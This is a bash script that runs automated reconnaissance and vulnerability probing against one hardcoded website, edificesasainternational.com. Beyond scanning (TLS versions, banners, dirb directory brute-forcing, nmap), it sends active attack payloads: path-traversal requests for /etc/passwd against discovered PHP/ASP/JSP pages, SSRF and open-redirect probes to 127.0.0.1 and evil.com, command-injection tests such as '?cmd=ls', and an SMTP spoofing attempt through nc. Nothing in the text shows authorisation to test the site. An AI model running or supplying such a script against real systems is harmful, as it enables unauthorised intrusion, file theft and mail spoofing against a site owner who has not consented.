#!/bin/bash

target="edificesasainternational.com"
ip=$(dig +short $target | head -n1)
output="recon-$(date +%F).txt"

echo "🔎 Target: $target ($ip)" | tee $output
echo "----------------------------------------" | tee -a $output

# 1. TLS Version Check
echo "[1] 🔐 TLS version scan..." | tee -a $output
for v in ssl2 ssl3 tls1 tls1_1 tls1_2 tls1_3; do
  echo -n " → $v: " | tee -a $output
  timeout 5 openssl s_client -$v -connect $target:443 < /dev/null 2>/dev/null | grep -q "Cipher is" &&
    echo "✅ Supported" | tee -a $output ||
    echo "❌ Not supported" | tee -a $output
done

# 2. Banner Grabbing for Language & CVE Guess
echo "[2] 🧠 Server banner + tech guessing..." | tee -a $output
banner=$(curl -sI https://$target | grep -i "Server:")
echo " → $banner" | tee -a $output
if [[ $banner == *"Apache"* ]]; then
  echo " → Apache detected. Checking known CVEs..." | tee -a $output
  echo "   - CVE-2021-41773: Path traversal/RCE (Apache 2.4.49)" | tee -a $output
elif [[ $banner == *"nginx"* ]]; then
  echo " → nginx detected. Known CVEs:" | tee -a $output
  echo "   - CVE-2021-23017: 1-byte mem overwrite via DNS resolver" | tee -a $output
fi

# 3. Language Fingerprinting
echo "[3] 🔍 Language guessing from HTTP headers..." | tee -a $output
curl -sI https://$target | grep -i "X-Powered-By" | tee -a $output

# 4. Directory Bruteforce
echo "[4] 📂 Directory scan using dirb..." | tee -a $output
dirb https://$target /usr/share/wordlists/dirb/common.txt -o dirb.out
cat dirb.out >> $output

# 5. SSRF & LFI Testing (light)
echo "[5] 🐍 SSRF / LFI Testing on common paths..." | tee -a $output
for p in "view?file=/etc/passwd" "url=http://127.0.0.1" "redirect=http://evil.com"; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://$target/$p")
  echo " → Test /$p => HTTP $code" | tee -a $output
done

# 6. RCE Payload Fingerprints
echo "[6] ☣️ RCE test via parameter injection..." | tee -a $output
for param in "cmd" "exec" "query" "input"; do
  payload="?$param=ls"
  res=$(curl -sk "https://$target/$payload")
  echo " → $param=ls => $(echo $res | head -c 60)..." | tee -a $output
done

# 7. SMTP Test
echo "[7] ✉️ SMTP Spoofing test..." | tee -a $output
(echo "EHLO evil.local"; echo "MAIL FROM:<root@$target>"; echo "RCPT TO:<you@example.com>"; echo "QUIT") | nc $target 25 | tee -a $output

# 8. FTP Test
echo "[8] 🔓 FTP banner..." | tee -a $output
echo | nc -v -w 3 $target 21 | tee -a $output

# 9. WHOIS and IP Info
echo "[9] 🌐 WHOIS Info:" | tee -a $output
whois $ip | grep -Ei "netname|country|orgname|descr" | tee -a $output

# 10. Port Status Recap
echo "[10] 🚪 Scanning important ports..." | tee -a $output
nmap -Pn -p 21,25,80,110,143,443,465,587,993,995 $target | tee -a $output

# 11. Vulnerable Param Dump
echo "[11] 🧬 Analyzing vulnerable parameters..." | tee -a $output
cat dirb.out | grep -E "\.php|\.asp|\.jsp" | while read line; do
  url=$(echo $line | awk '{print $1}')
  for p in id file page query include view; do
    echo " → Testing $url?$p=../../../../etc/passwd" | tee -a $output
    curl -sk "$url?$p=../../../../etc/passwd" | head -n 10 | tee -a $output
  done
done

echo "✅ Recon complete. All results saved in $output."
